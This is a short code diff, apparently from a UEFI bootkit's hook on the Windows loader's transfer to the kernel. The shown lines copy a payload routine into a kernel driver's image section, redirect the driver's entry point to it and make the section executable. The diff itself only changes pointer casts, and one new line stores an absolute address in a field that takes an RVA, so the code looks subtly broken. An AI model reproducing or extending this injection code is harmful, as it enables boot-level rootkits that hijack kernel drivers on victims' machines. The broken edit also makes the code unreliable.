@@ -87,14 +87,18 @@ D_SEC( B ) VOID EFIAPI OslArchTransferToKernelHook( _In_ PVOID LoaderBlock, _In_
 					Eft->TgtDrvAddressOfEntrypoint = Nth->OptionalHeader.AddressOfEntryPoint;
 
 					/* Find the total length of the buffer */
-					Len = C_PTR( U_PTR( U_PTR( GetIp() ) + 11 ) - U_PTR( G_PTR( DrvMain ) ) );
+					//Len = C_PTR( U_PTR( U_PTR( GetIp() ) + 11 ) - U_PTR( G_PTR( DrvMain ) ) );
+					Len = (SIZE_T)((uintptr_t)GetIp() + 11 - (uintptr_t)G_PTR(DrvMain));
 
 					/* Insert DrvMainStart */
 					__builtin_memcpy( C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress ), C_PTR( G_PTR( DrvMain ) ), Len );
 
 					/* Insert a hook! */
 					Ldr->EntryPoint                         = C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress );
-					Nth->OptionalHeader.AddressOfEntryPoint = C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress );
+					
+					//Nth->OptionalHeader.AddressOfEntryPoint = C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress );
+					Nth->OptionalHeader.AddressOfEntryPoint = (DWORD)((uintptr_t)Dos + Sec[Idx].VirtualAddress);
+
 
 					/* Set -x permission in section */
 					Sec[ Idx ].Characteristics |= IMAGE_SCN_MEM_EXECUTE;
